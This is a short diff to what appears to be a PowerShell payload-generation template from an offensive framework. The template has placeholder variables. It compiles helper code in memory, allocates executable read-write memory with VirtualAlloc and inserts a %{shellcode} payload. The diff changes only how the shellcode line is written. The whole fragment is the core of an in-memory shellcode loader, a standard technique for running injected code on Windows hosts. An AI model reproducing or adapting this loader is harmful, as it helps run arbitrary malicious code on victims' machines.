@@ -20,7 +20,7 @@ $%{var_compileParams}.ReferencedAssemblies.AddRange(@("System.dll", [PsObject].A
 $%{var_compileParams}.GenerateInMemory = $True
 $%{var_output} = $%{var_codeProvider}.CompileAssemblyFromSource($%{var_compileParams}, $%{var_syscode})
 
-[Byte[]]$%{var_code} = %{shellcode}
+%{shellcode}
 
 $%{var_baseaddr} = [%{var_kernel32}.func]::VirtualAlloc(0, $%{var_code}.Length + 1, [%{var_kernel32}.func+AllocationType]::Reserve -bOr [%{var_kernel32}.func+AllocationType]::Commit, [%{var_kernel32}.func+MemoryProtection]::ExecuteReadWrite)
 if ([Bool]!$%{var_baseaddr}) { $global:result = 3; return }
